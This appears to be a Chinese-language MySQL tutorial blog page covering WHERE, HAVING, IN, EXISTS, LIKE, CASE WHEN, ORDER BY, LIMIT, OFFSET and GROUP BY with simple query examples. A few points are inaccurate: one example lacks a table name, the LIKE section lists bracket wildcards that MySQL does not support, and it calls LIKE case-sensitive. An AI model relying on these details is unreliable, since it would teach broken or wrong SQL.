<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure>

<p>在这里，<code>column1</code>, <code>column2</code>, … 是你想要从表中选择的列的名称，<code>table_name</code> 是你想要查询的表的名称，<code>condition</code> 是用于确定哪些记录应该被返回的条件。</p>
<p>以下是一些使用<code>WHERE</code>子句的例子：</p>
<ol>
<li><p><strong>基于单个条件的查询：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> age <span class="operator">&gt;</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure>

<p> 这个查询将返回年龄大于 20 的所有学生记录。</p>
</li>
<li><p><strong>基于多个条件的查询：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> age <span class="operator">&gt;</span> <span class="number">20</span> <span class="keyword">AND</span> gender <span class="operator">=</span> <span class="string">&#x27;Female&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p> 这个查询将返回年龄大于 20 并且性别为女性的学生记录。</p>
</li>
<li><p><strong>使用比较运算符的查询：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> age <span class="keyword">BETWEEN</span> <span class="number">18</span> <span class="keyword">AND</span> <span class="number">25</span>;</span><br></pre></td></tr></table></figure>

<p> 这个查询将返回年龄在 18 到 25 之间的学生记录。</p>
</li>
<li><p><strong>使用逻辑运算符的查询：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> age <span class="operator">&gt;</span> <span class="number">20</span> <span class="keyword">OR</span> gender <span class="operator">=</span> <span class="string">&#x27;Female&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p> 这个查询将返回年龄大于 20 或性别为女性的学生记录。</p>
</li>
</ol>
<p>请注意，<code>WHERE</code>子句可以使用比较运算符（如 <code>=</code>, <code>&lt;&gt;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>），逻辑运算符（如 <code>AND</code>, <code>OR</code>, <code>NOT</code>），以及其他条件表达式（如 <code>IN</code>, <code>LIKE</code>, <code>IS NULL</code> 等）来构建复杂的条件。</p>
<p>WHERE可以对GROUP BY分组前的记录进行过滤，即在如下语句中，WHERE在GROUP BY之前执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">	empid, AVG(sales)</span><br><span class="line">FROM</span><br><span class="line">	WHERE sales &gt;= 50</span><br><span class="line">GROUP BY empid;</span><br></pre></td></tr></table></figure>

<h2 id="HAVING"><a href="#HAVING" class="headerlink" title="HAVING"></a>HAVING</h2><p>在MySQL中，HAVING子句只能和GROUP BY子句搭配使用，<code>HAVING</code>子句用于在<code>GROUP BY</code>子句后对分组结果进行筛选，而且只能对聚合函数进行过滤和筛选。而GROUP BY子句则是将原始数据集按照指定的列进行分组，生成多个子集，并可使用聚合函数对每个子集进行计算，HAVING是在分组后执行的。</p>
<p>在执行GROUP BY子句之后，可以使用HAVING子句来进一步筛选符合条件的结果集。</p>
<p>在MySQL中，<code>HAVING</code>子句用于在<code>GROUP BY</code>子句后对分组结果进行筛选。它允许你使用聚合函数和条件来过滤分组后的结果集。</p>
<p>以下是<code>HAVING</code>的基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ..., aggregate_function(<span class="keyword">column</span>)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> column1, column2, ...</span><br><span class="line"><span class="keyword">HAVING</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure>

<p>在这里，<code>column1</code>, <code>column2</code>, … 是你想要从表中选择的列的名称，<code>table_name</code> 是你想要查询的表的名称，<code>aggregate_function</code> 是一个聚合函数（如 <code>SUM</code>, <code>COUNT</code>, <code>AVG</code> 等），<code>column</code> 是你想要按照其进行分组的列，<code>condition</code> 是用于筛选结果的条件。</p>
<p>以下是一个例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> department, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">as</span> total_students</span><br><span class="line"><span class="keyword">FROM</span> students</span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> department</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">&gt;</span> <span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<p>这个查询将根据学生表中的<code>department</code>列对记录进行分组，并计算每个部门的学生人数。然后，<code>HAVING</code>子句筛选出具有超过 10 名学生的部门。</p>
<p>请注意，<code>HAVING</code>子句在查询中的位置很重要，它通常出现在<code>GROUP BY</code>子句之后，<code>ORDER BY</code>子句之前。与<code>WHERE</code>子句不同，<code>HAVING</code>子句可以使用聚合函数和列的别名来指定条件。</p>
<p>另外，如果你只想筛选单个表中的数据而不进行分组，你可以使用<code>WHERE</code>子句。<code>HAVING</code>子句主要用于筛选分组后的结果。</p>
<h2 id="BETWEEN"><a href="#BETWEEN" class="headerlink" title="BETWEEN"></a>BETWEEN</h2><p>在MySQL中，BETWEEN是一个比较运算符，用于检查一个值是否在指定的一组或区间内。它能够用于数字，日期和时间等数据类型。</p>
<p>BETWEEN语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value BETWEEN low AND high;</span><br></pre></td></tr></table></figure>

<p>其中，value是需要进行比较的值，low和high是指定的区间范围。对于数字类型的值来说，BETWEEN会返回一个布尔值，表示这个值是否在区间范围内；而对于日期和时间类型的值来说，BETWEEN则会将这个值转换为一个日期&#x2F;时间对象后再进行比较。</p>
<p>例如，假设我们有一个名为<code>orders</code>的表格，其中包含了订单的信息，包括订单编号、下单日期和订单总额等。如果我们想要查询某一段时间内的订单，可以使用BETWEEN关键字来实现，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM orders WHERE order_date BETWEEN &#x27;2021-01-01&#x27; AND &#x27;2021-03-31&#x27;;</span><br></pre></td></tr></table></figure>

<p>这条语句查询了从2021年1月1日到2021年3月31日之间的订单信息。</p>
<p>需要注意的是，在使用BETWEEN时，应该确保low和high的顺序正确，即low应该小于等于high。否则会导致结果不准确。同时也需要注意数据类型的匹配问题，避免类型不匹配的情况。</p>
<h2 id="IN"><a href="#IN" class="headerlink" title="IN"></a>IN</h2><p>在MySQL中，<code>IN</code>是一个逻辑运算符，它允许你在<code>WHERE</code>或<code>HAVING</code>子句中指定多个值。以下是其基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">IN</span> (value1, value2, ...);</span><br></pre></td></tr></table></figure>

<p>在这个语句中，<code>column1</code>, <code>column2</code>, … 是你想从表中选择的列的名称，<code>table_name</code>是你想从中选择数据的表的名称，<code>column_name</code>是你想要应用条件的列的名称，<code>value1</code>, <code>value2</code>, … 是你想在列中查找的值。</p>
<p>例如，如果你想从<code>students</code>表中选择名字为’John Doe’或’Jane Doe’的学生，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> name <span class="keyword">IN</span> (<span class="string">&#x27;John Doe&#x27;</span>, <span class="string">&#x27;Jane Doe&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><code>IN</code>运算符等价于多个<code>OR</code>条件。上面的查询等价于以下查询：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;John Doe&#x27;</span> <span class="keyword">OR</span> name <span class="operator">=</span> <span class="string">&#x27;Jane Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>你还可以在<code>IN</code>子句中使用子查询来动态生成值的列表。例如，以下查询会选择所有在<code>courses</code>表中有记录的学生：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> id <span class="keyword">IN</span> (<span class="keyword">SELECT</span> student_id <span class="keyword">FROM</span> courses);</span><br></pre></td></tr></table></figure>

<p>在这个例子中，子查询<code>SELECT student_id FROM courses</code>会返回所有在<code>courses</code>表中有记录的学生的ID，然后主查询会从<code>students</code>表中选择这些ID对应的学生。</p>
<p>“&#x3D;”不能代替IN，因为“&#x3D;”在返回结果多于一条的时候会报错，“Subquery returns more than 1 row”。</p>
<h2 id="EXISTS"><a href="#EXISTS" class="headerlink" title="EXISTS"></a>EXISTS</h2><p>在MySQL中，<code>EXISTS</code>是一个条件运算符，用于检查一个子查询是否返回了任何行。它通常与<code>SELECT</code>语句的<code>WHERE</code>子句一起使用。</p>
<p>以下是<code>EXISTS</code>的基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (subquery);</span><br></pre></td></tr></table></figure>

<p>在这里，<code>column1</code>, <code>column2</code>, … 是你想要从表中选择的列的名称，<code>table_name</code> 是你想要查询的表的名称，<code>subquery</code> 是一个子查询，它可以是一个完整的<code>SELECT</code>语句。</p>
<p>以下是一个例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name</span><br><span class="line"><span class="keyword">FROM</span> students</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="keyword">FROM</span> courses</span><br><span class="line">    <span class="keyword">WHERE</span> courses.student_id <span class="operator">=</span> students.id</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>这个查询将返回在<code>students</code>表中存在对应课程的学生的姓名。子查询检查是否存在与<code>students</code>表中的学生关联的记录在<code>courses</code>表中。</p>
<p><code>EXISTS</code>运算符返回布尔值（<code>TRUE</code>或<code>FALSE</code>），如果子查询返回至少一行，则为<code>TRUE</code>，否则为<code>FALSE</code>。它通常用于<code>WHERE</code>子句中作为一个条件来过滤查询结果。</p>
<p>请注意，<code>EXISTS</code>子查询可以是任意复杂的查询，它可以包含聚合函数、子查询、连接等。在使用<code>EXISTS</code>时，关联子查询通常使用相关列来建立条件，以与外部查询进行关联。</p>
<h2 id="LIKE"><a href="#LIKE" class="headerlink" title="LIKE"></a>LIKE</h2><p>在MySQL中，<code>LIKE</code>是一个用于模式匹配的操作符，通常用于<code>WHERE</code>子句中以过滤符合特定模式的数据。</p>
<p>以下是<code>LIKE</code>的基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> <span class="keyword">pattern</span>;</span><br></pre></td></tr></table></figure>

<p>在这里，<code>column1</code>, <code>column2</code>, … 是你想要从表中选择的列的名称，<code>table_name</code> 是你想要查询的表的名称，<code>column_name</code> 是你想要应用模式匹配的列的名称，<code>pattern</code> 是匹配模式。</p>
<p><code>LIKE</code>操作符使用通配符来匹配模式，常用的通配符有：</p>
<ul>
<li><code>%</code>：匹配任意字符（包括零个字符）。</li>
<li><code>_</code>：匹配任意单个字符。</li>
<li><code>[characters]</code>：匹配指定字符集中的任意单个字符。</li>
<li><code>[^characters]</code>：匹配不在指定字符集中的任意单个字符。</li>
</ul>
<p>以下是一些使用<code>LIKE</code>的例子：</p>
<ol>
<li><p><strong>以特定字符开头的匹配：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> name <span class="keyword">LIKE</span> <span class="string">&#x27;J%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p> 这个查询将返回名字以字母 ‘J’ 开头的所有学生记录。</p>
</li>
<li><p><strong>以特定字符结尾的匹配：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> email <span class="keyword">LIKE</span> <span class="string">&#x27;%example.com&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p> 这个查询将返回邮箱以 ‘@example.com’ 结尾的所有学生记录。</p>
</li>
<li><p><strong>包含特定字符的匹配：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> name <span class="keyword">LIKE</span> <span class="string">&#x27;%Doe%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p> 这个查询将返回名字中包含 ‘Doe’ 的所有学生记录。</p>
</li>
<li><p><strong>指定单个字符的匹配：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> name <span class="keyword">LIKE</span> <span class="string">&#x27;_ohn&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p> 这个查询将返回名字为四个字符并以 ‘ohn’ 结尾的所有学生记录，其中第二个字符可以是任意字符。</p>
</li>
</ol>
<p>请注意，<code>LIKE</code>匹配区分大小写，如果需要不区分大小写的匹配，可以使用<code>COLLATE</code>关键字指定不区分大小写的字符集，如 <code>WHERE column_name COLLATE utf8_general_ci LIKE pattern;</code>。</p>
<h2 id="CASE-WHEN"><a href="#CASE-WHEN" class="headerlink" title="CASE WHEN"></a>CASE WHEN</h2><p>MySQL 的 CASE WHEN 是一种条件表达式，它类似于其他编程语言中的 switch 或 if-then-else 结构。它可以在 SELECT 语句中使用，根据一个或多个条件返回不同的值。</p>
<p>CASE WHEN 语法的基本结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CASE expression</span><br><span class="line">WHEN value_1 THEN result_1</span><br><span class="line">WHEN value_2 THEN result_2</span><br><span class="line">...</span><br><span class="line">ELSE default_result</span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<p>CASE 关键字后面的 expression 是要检查的值或表达式，value_x 是与 expression 进行比较的值，而 result_x 则是与 value_x 对应的结果。如果 expression 和某个 value_x 相匹配，则会返回对应的 result_x。如果都没有匹配，将会执行 ELSE 子句中指定的 default_result（可选的，如果没有 ELSE 子句，将返回 NULL）。</p>
<p>以下是一个简单的例子，演示了如何在 SELECT 语句中使用 CASE WHEN：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT employee_name, </span><br><span class="line">CASE department_id</span><br><span class="line">	WHEN 1 THEN &#x27;Sales&#x27;</span><br><span class="line">    WHEN 2 THEN &#x27;Marketing&#x27;</span><br><span class="line">    ELSE &#x27;Other&#x27;</span><br><span class="line">END as department</span><br><span class="line">FROM employees;</span><br></pre></td></tr></table></figure>

<p>这条语句查询了一个名为 employees 的表格，其中包含员工信息，包括姓名、部门编号等。它使用 CASE WHEN 结构来把部门编号转换为对应的文本描述，最终会返回每个员工的名称和所在部门的文本标签。</p>
<p>需要注意的是，CASE WHEN 也支持复杂的判断逻辑和多个条件，可以使用嵌套和逻辑运算符来实现复杂的条件判断。</p>
<p>以下是CASE WHEN的另一个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT id,</span><br><span class="line">CASE</span><br><span class="line">	WHEN sales &gt;= 100 THEN &#x27;高&#x27;</span><br><span class="line">	WHEN sales &gt;= 50 THEN &#x27;中等&#x27;</span><br><span class="line">    ELSE &#x27;低&#x27;</span><br><span class="line">END AS &#x27;评价&#x27;</span><br><span class="line">FROM tb;</span><br></pre></td></tr></table></figure>

<h2 id="IF-ELSE"><a href="#IF-ELSE" class="headerlink" title="IF ELSE"></a>IF ELSE</h2><p>在MySQL中，可以使用<code>IF</code>和<code>THEN</code>关键字来实现条件语句。基本语法如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IF condition THEN</span><br><span class="line">    statement(s);</span><br><span class="line">ELSE</span><br><span class="line">    statement(s);</span><br><span class="line">END IF;</span><br></pre></td></tr></table></figure>

<p>其中，如果“condition”（条件）为真，则执行<code>THEN</code>子句中的一个或多个语句，否则执行<code>ELSE</code>子句中的一个或多个语句。ELSE&#96;块是可选的。</p>
<p>让我们看一个实际的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SET @score = 80;</span><br><span class="line"></span><br><span class="line">IF @score &gt;= 60 THEN</span><br><span class="line">    SELECT &#x27;Pass&#x27;;</span><br><span class="line">ELSE</span><br><span class="line">    SELECT &#x27;Fail&#x27;;</span><br><span class="line">END IF;</span><br></pre></td></tr></table></figure>

<p>在上述示例中，将变量<code>@score</code>设置为80分。然后，使用<code>IF</code>语句检查是否及格（分数大于等于60）。如果成立，则输出“Pass”，否则输出“Fail”。</p>
<h2 id="ORDER-BY和ACS或DESC"><a href="#ORDER-BY和ACS或DESC" class="headerlink" title="ORDER BY和ACS或DESC"></a>ORDER BY和ACS或DESC</h2><p>在MySQL中，你可以使用<code>ORDER BY</code>子句对查询结果进行排序。<code>ORDER BY</code>子句可以指定按照一个或多个列进行升序（默认）或降序排序。</p>
<p>以下是<code>ORDER BY</code>子句的基本语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table_name</span><br><span class="line">ORDER BY column1 [ASC|DESC], column2 [ASC|DESC], ...;</span><br></pre></td></tr></table></figure>

<p>在这里，<code>column1</code>, <code>column2</code>, … 是你想要排序的列的名称，<code>ASC</code>表示升序（默认），<code>DESC</code>表示降序。</p>
<p>以下是一些例子：</p>
<ol>
<li><p><strong>按照单个列进行升序排序：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM students</span><br><span class="line">ORDER BY name ASC;</span><br></pre></td></tr></table></figure>

<p> 这将按照<code>name</code>列的字母顺序对<code>students</code>表中的记录进行升序排序。</p>
</li>
<li><p><strong>按照单个列进行降序排序：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM students</span><br><span class="line">ORDER BY age DESC;</span><br></pre></td></tr></table></figure>

<p> 这将按照<code>age</code>列的逆序（从高到低）对<code>students</code>表中的记录进行降序排序。</p>
</li>
<li><p><strong>按照多个列进行排序：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM students</span><br><span class="line">ORDER BY age ASC, name ASC;</span><br></pre></td></tr></table></figure>

<p> 这将首先按照<code>age</code>列进行升序排序，然后对于具有相同<code>age</code>值的记录，按照<code>name</code>列的字母顺序进行升序排序。</p>
</li>
</ol>
<p>请注意，<code>ORDER BY</code>子句应该在<code>SELECT</code>语句的最后使用。如果你想在查询结果中以相反的顺序排序，只需在列名后使用<code>DESC</code>关键字。默认情况下，排序是升序的（ASC）。</p>
<p>ORDER BY可以实现对分组后的结果进行排序，MySQL语句中先写“GROUP BY”再写“ORDER BY”，示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">	empid, AVG(sales)</span><br><span class="line">FROM tb</span><br><span class="line">	GROUP BY empid</span><br><span class="line">ORDER BY AVG(sales)</span><br><span class="line">	DESC;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT empid, AVG(sales)</span><br><span class="line">	FROM tb</span><br><span class="line">GROUP BY empid</span><br><span class="line">	HAVING AVG(sales) &gt; 50</span><br><span class="line">ORDER BY AVG(sales)</span><br><span class="line">	DESC;</span><br></pre></td></tr></table></figure>

<h2 id="LIMIT"><a href="#LIMIT" class="headerlink" title="LIMIT"></a>LIMIT</h2><p>在MySQL中，<code>LIMIT</code>用于限制查询结果的数量。它可以在<code>SELECT</code>语句中用于指定返回的行数。</p>
<p>以下是<code>LIMIT</code>的基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line">LIMIT number_of_rows;</span><br></pre></td></tr></table></figure>

<p>在这里，<code>column1</code>, <code>column2</code>, … 是你想要从表中选择的列的名称，<code>table_name</code> 是你想要查询的表的名称，<code>number_of_rows</code> 是你希望返回的行数。</p>
<p>以下是一些使用<code>LIMIT</code>的例子：</p>
<ol>
<li><p><strong>限制结果集的行数：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students LIMIT <span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<p> 这个查询将返回 <code>students</code> 表中的前 10 行记录。</p>
</li>
<li><p><strong>指定起始位置和行数：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students LIMIT <span class="number">5</span>, <span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<p> 这个查询将从 <code>students</code> 表中的第 6 行开始（偏移量为 5），返回后续的 10 行记录。这是通过使用两个参数来实现的，第一个参数是起始位置的偏移量，第二个参数是要返回的行数。</p>
</li>
</ol>
<p><code>LIMIT</code>语句还可以与<code>ORDER BY</code>子句一起使用，以在指定排序顺序的基础上限制结果集的行数。例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students <span class="keyword">ORDER</span> <span class="keyword">BY</span> age <span class="keyword">DESC</span> LIMIT <span class="number">5</span>;</span><br></pre></td></tr></table></figure>

<p>这个查询将按照年龄降序排序，并返回年龄最大的前 5 条学生记录。</p>
<p>请注意，<code>LIMIT</code>子句在查询中的位置很重要，它通常出现在<code>SELECT</code>语句的末尾。</p>
<h2 id="OFFSET"><a href="#OFFSET" class="headerlink" title="OFFSET"></a>OFFSET</h2><p>在 MySQL 中，<code>OFFSET</code> 用于从查询结果的某个特定行开始返回数据。<code>OFFSET</code> 必须和 <code>LIMIT</code> 一起使用，以便明确指定要返回的行数和偏移量。</p>
<p><code>OFFSET</code> 的语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table</span><br><span class="line">WHERE condition</span><br><span class="line">ORDER BY column1, column2, ...</span><br><span class="line">LIMIT offset, count;</span><br></pre></td></tr></table></figure>

<p>另一种语法是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table</span><br><span class="line">WHERE condition</span><br><span class="line">ORDER BY column1, column2, ...</span><br><span class="line">LIMIT count OFFSET offset;</span><br></pre></td></tr></table></figure>

<p>其中，<code>offset</code> 是要偏移的行数，<code>count</code> 是要返回的行数。例如，如果希望跳过前 5 行并获取接下来的 10 行，可以这样写：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM mytable</span><br><span class="line">ORDER BY id</span><br><span class="line">LIMIT 5, 10;</span><br></pre></td></tr></table></figure>

<p>或写为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM mytable</span><br><span class="line">ORDER BY id</span><br><span class="line">LIMIT 10 OFFSET 5;</span><br></pre></td></tr></table></figure>

<p>这个查询将返回表中排序后的第 6 行到第 15 行，因为它跳过前 5 行（即偏移量为 5），然后返回接下来的 10 行。</p>
<p>需要注意的是，在处理大数据集时， OFFSET 可能会影响查询性能，因为它需要跳过指定数量的行，直到达到指定偏移量。为了避免此类问题，可以考虑优化查询或者通过其他手段减少数据集的大小。</p>
<h2 id="GROUP-BY"><a href="#GROUP-BY" class="headerlink" title="GROUP BY"></a>GROUP BY</h2><p>在MySQL中，<code>GROUP BY</code>子句用于将查询结果按照一个或多个列进行分组。它常与聚合函数（如<code>SUM</code>、<code>COUNT</code>、<code>AVG</code>等）一起使用，以对每个组应用聚合函数并生成汇总结果。</p>
<p>以下是<code>GROUP BY</code>的基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ..., aggregate_function(<span class="keyword">column</span>)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> column1, column2, ...;</span><br></pre></td></tr></table></figure>

